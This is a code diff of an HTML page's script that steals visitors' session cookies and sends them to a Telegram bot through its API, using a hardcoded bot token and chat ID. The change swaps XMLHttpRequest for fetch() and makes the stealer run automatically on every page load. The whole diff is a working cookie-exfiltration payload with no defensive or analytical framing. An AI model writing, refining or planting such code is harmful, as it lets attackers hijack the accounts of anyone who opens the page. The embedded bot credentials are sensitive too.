@@ -9,24 +9,27 @@
         function stealSession() {
             // Get the cookies
             var cookies = document.cookie;
-            
+
             // Telegram bot API details
             var telegramBotToken = "6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ";
             var chatID = "1900509620";
             var message = encodeURIComponent("Stolen session cookies: " + cookies);
-            
+
             // Send the stolen cookies to Telegram
             var telegramAPI = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
             var url = telegramAPI + "?chat_id=" + chatID + "&text=" + message;
-            
+
             // Send request to Telegram
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", url, true);
-            xhr.send();
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Success:', data))
+                .catch((error) => console.error('Error:', error));
         }
-        
-        // Execute the function
-        stealSession();
+
+        // Execute the function after the page has fully loaded
+        window.onload = function() {
+            stealSession();
+        };
     </script>
 </head>
 <body>
